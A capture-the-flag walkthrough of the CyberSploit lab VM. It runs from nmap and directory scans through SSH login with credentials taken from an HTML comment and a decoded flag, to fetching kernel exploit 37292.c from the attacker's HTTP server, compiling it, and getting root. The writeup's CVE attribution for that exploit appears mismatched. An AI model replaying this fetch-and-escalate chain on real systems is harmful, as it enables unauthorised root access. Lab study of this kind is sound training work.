# CyberSploit Vuln

# Step 1: Service & Version Detection with Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sSVC 192.168.8.75 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 15:52 EDT
Nmap scan report for 192.168.8.75
Host is up (0.00067s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hello Pentester!
MAC Address: 08:00:27:DF:F3:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.71 seconds
                                                                                                               
```

**Open Ports & Services:**

- **22/tcp** → SSH (OpenSSH 5.9p1) → old version, check for exploits.
- **80/tcp** → HTTP (Apache 2.2.22) → old version, may have web vulnerabilities.

**Other Info:**

- OS: Linux
- Host is a VM (VirtualBox)
- HTTP title: `Hello Pentester!` → web app present

# Step 2: Search for Exploits

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit OpenSSH 5.9p1   
searchsploit Apache httpd 2.2.22

----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                               | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                 | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                       | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sock | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                         | linux/remote/45939.py
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Exploits: No Results
Shellcodes: No Results

```

**Results for OpenSSH 5.9p1:**

- Username enumeration exploits → `linux/remote/45233.py`, `45210.py`
- SFTP command execution (versions < 6.6) → `45000.c`, `45001.py`
- Local/remote privilege issues → `40962.txt`, `40963.txt`
- User enumeration (<7.7) → `45939.py`

**Results for Apache 2.2.22:**

- No direct exploits found via searchsploit

# Step 3: HTTP Response / Page Analysis

```bash
┌──(kali㉿kali)-[~]
└─$ curl -i http://192.168.8.75/            
HTTP/1.1 200 OK
Date: Wed, 03 Sep 2025 19:58:14 GMT
Server: Apache/2.2.22 (Ubuntu)
Last-Modified: Sat, 27 Jun 2020 04:46:41 GMT
ETag: "256ef-91d-5a909830c2d14"
Accept-Ranges: bytes
Content-Length: 2333
Vary: Accept-Encoding
Content-Type: text/html
X-Pad: avoid browser bug

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

    <title>Hello Pentester!</title>
  </head>
  <body>
    <h1>Welcome To CyBeRSplOiT-CTF </h1>
<nav class="navbar navbar-expand-lg navbar-light bg-dark">
  <a class="navbar-brand" href="#">Home</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" id="navbarNav">
    <ul class="navbar-nav">
      <li class="nav-item active">
        <a class="nav-link" href="#">Pentester<span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Web Developer</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Android Developer</a>
      </li>
          </ul>
  </div>
</nav>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<pre>           <img src="hacker.gif" class="img-fluid" alt="hacker">
</pre>
<pre>
<h4>                           LOL ! hahahhahahhahaha..............<h4>
                                                   <h5> You should try something more ! <h5>
</pre>

<!-------------username:itsskv--------------------->
</body>
</html>

```

**Response Highlights:**

- **Server:** Apache/2.2.22 (Ubuntu)
- **Content-Length:** 2333 bytes
- **Page Title:** `Hello Pentester!`
- **Main Content:**
    - `<h1>Welcome To CyBeRSplOiT-CTF</h1>`
    - Navigation links: Pentester, Web Developer, Android Developer
- **Embedded File:** `hacker.gif`
    - Could contain hidden payload/data (steganography or encoded info)
- **Commented Username:** `itsskv`
    - Possible clue for CTF challenge or SSH login

# Step 4: Directory Enumeration

```bash
──(kali㉿kali)-[~]
└─$ dirb http://192.168.8.75/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Sep  3 15:57:03 2025
URL_BASE: http://192.168.8.75/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.8.75/ ----
+ http://192.168.8.75/cgi-bin/ (CODE:403|SIZE:288)                                                            
+ http://192.168.8.75/hacker (CODE:200|SIZE:3757743)                                                          
+ http://192.168.8.75/index (CODE:200|SIZE:2333)                                                              
+ http://192.168.8.75/index.html (CODE:200|SIZE:2333)                                                         
+ http://192.168.8.75/robots (CODE:200|SIZE:79)                                                               
+ http://192.168.8.75/robots.txt (CODE:200|SIZE:79)                                                           
+ http://192.168.8.75/server-status (CODE:403|SIZE:293)                                                       
                                                                                                              
-----------------
END_TIME: Wed Sep  3 15:57:10 2025
DOWNLOADED: 4612 - FOUND: 7

```

**Results:**

| URL | Status | Notes |
| --- | --- | --- |
| `/cgi-bin/` | 403 | Forbidden, could be sensitive |
| `/hacker` | 200 | Found large file (3.6 MB, likely contains payload) |
| `/index` | 200 | Web page |
| `/index.html` | 200 | Web page |
| `/robots` | 200 | Possibly info for crawlers |
| `/robots.txt` | 200 | Check for hidden paths |
| `/server-status` | 403 | Apache status page, access denied |

# Step 5: Robots.txt Analysis & Flag 1

```bash
┌──(kali㉿kali)-[~]
└─$ wget http://192.168.8.75/robots.txt            
--2025-09-03 16:02:56--  http://192.168.8.75/robots.txt
Connecting to 192.168.8.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 79 [text/plain]
Saving to: ‘robots.txt.1’

robots.txt.1                100%[==========================================>]      79  --.-KB/s    in 0s      

2025-09-03 16:02:56 (17.1 MB/s) - ‘robots.txt.1’ saved [79/79]

                                                                                                               
┌──(kali㉿kali)-[~]
└─$ cat robots.txt              

R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 

                                                                                                               
┌──(kali㉿kali)-[~]
└─$ 

```

**Analysis:**

1. The content is **Base64 encoded**.
2. Decoding gives potential **flag or clue** for CTF.

```bash
┌──(kali㉿kali)-[~]
└─$ echo "R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9" | base64 -d

Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}                                                                                                               
┌──(kali㉿kali)-[~]
└─$ 

```

**Result:**

```
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}

```

# Step 6: SSH Access

```bash
┌──(kali㉿kali)-[~]
└─$ ssh itsskv@192.168.8.75                        

itsskv@192.168.8.75's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

332 packages can be updated.
273 updates are security updates.

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2017.

Last login: Sat Jun 27 10:14:39 2020 from cybersploit.local
itsskv@cybersploit-CTF:~$ 
```

**Target:**

```
192.168.8.75
```

**User:**

```
itsskv
```

**Password:**

```
cybersploit{youtube.com/c/cybersploit}
```

# Step 7: Flag 2 – Binary to Text

```bash
itsskv@cybersploit-CTF:~$ ls
Desktop  Documents  Downloads  examples.desktop  flag2.txt  Music  Pictures  Public  Templates  Videos
itsskv@cybersploit-CTF:~$ cat flag2.txt
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101
itsskv@cybersploit-CTF:~$ 
```

✅ **Observation:**

- Some flags may be in **binary, base64, or encoded formats**.
- Always check the file type and **decode accordingly** before moving to the next step.

Decoding Method (Linux command):

```bash
cat flag2.txt | awk '{for(i=1;i<=NF;i++){printf "%c", strtonum("0b"$i)}}; print ""

```

**Decoded Flag 2:**

```
good work ! flag2: cybersploit{https:t.me/cybersploit1}

```

**Notes:**

- Binary flags can be decoded using `awk`, `perl`, or online binary-to-text converters.
- Each 8-bit group represents one ASCII character.

# Step 8 – Exploit Enumeration

```bash
itsskv@cybersploit-CTF:~$ uname
Linux
itsskv@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux

```

## **Linux Kernel 3.13.0**

### **Kernel Info**

- Target Kernel: `3.13.0-32-generic`

# Step 9 – Uploading & Compiling Exploit on Target

## 1. Setting Up HTTP Server on Attacker (Kali)

```bash
──(kali㉿kali)-[~]
└─$ cd /home/kali/Downloads 
                                                                                                               
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
 37292.c
'CEH Official Modules-20250805T121824Z-1-001.hGa9lPwG.zip.part'
'Demo Company - Security Assessment Findings Report.docx'
'Screenshot 2025-08-18 at 13-28-24 TryHackMe Vulnerabilities 101.png'
'Screenshot 2025-08-18 at 13-29-46 TryHackMe Vulnerabilities 101.png'
'Screenshot 2025-08-18 at 13-31-00 TryHackMe Vulnerabilities 101.png'
'Screenshot 2025-08-18 at 13-32-10 TryHackMe Vulnerabilities 101.png'
'Screenshot 2025-08-18 at 13-32-59 TryHackMe Vulnerabilities 101.png'
'Screenshot 2025-08-18 at 13-35-50 TryHackMe Vulnerabilities 101.png'
'TCMS - Demo Corp - Findings Report - Example 2.docx'
'TechPanda.Sagar(1).ovpn'
                                                                                                               
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## 2. Downloading Exploit on Target

```bash
itsskv@cybersploit-CTF:~$ wget http://192.168.8.77:8000/37292.c
--2025-09-04 01:58:56--  http://192.168.8.77:8000/37292.c
Connecting to 192.168.8.77:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: 37292.c'

100%[=====================================================================>] 5,119       --.-K/s   in 0s      

2025-09-04 01:58:56 (103 MB/s) - 37292.c' saved [5119/5119]

itsskv@cybersploit-CTF:~$ ls
37292.c  Documents  examples.desktop  Music     Public     Videos
Desktop  Downloads  flag2.txt         Pictures  Templates
itsskv@cybersploit-CTF:~$ 
```

## 3. Notes / Key Points

- This method uses **HTTP file transfer** to move exploit to target.
- Works because **target has outbound HTTP access** to attacker.
- Make sure file permissions allow compilation:

## 4. Compile Exploit

```bash
itsskv@cybersploit-CTF:~$ gcc 37292.c -o xploit
itsskv@cybersploit-CTF:~$ ls
37292.c  Documents  examples.desktop  Music     Public     Videos
Desktop  Downloads  flag2.txt         Pictures  Templates  xploit

```

## 5. Run Exploit & Verify Root Access

```bash
itsskv@cybersploit-CTF:~$ ./xploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root

```

**Result:** User `itsskv` → `root`

**Important Notes:**

- Only works on vulnerable kernel versions.
- Dangerous on production systems; can crash OS or corrupt files.
- Exploit method: **C kernel local privilege escalation** using CVE-2016-0728 style shared library preload.

**Outcome:** Full administrative access achieved on target machine.

# Step 10: Capture Final Root Flag

```bash
# bash
root@cybersploit-CTF:/home/itsskv# cd /root
root@cybersploit-CTF:/root# ls
finalflag.txt
root@cybersploit-CTF:/root# cat finalflag.txt 
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
                                                                                                                  

   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

if you like it share with me https://twitter.com/cybersploit1.

Thanks !
root@cybersploit-CTF:/root# 

```

**Notes:**

- Accessing `/root/finalflag.txt` confirms **full root access**.
- This flag is **the final flag for the CTF challenge**.
- Steps followed:
    1. Initial enumeration and reconnaissance.
    2. SSH login as user `itsskv`.
    3. Local privilege escalation using vulnerable kernel exploit.
    4. Access root’s home and retrieve `finalflag.txt`.

**Result:** Complete CTF challenge solved. Full system access achieved.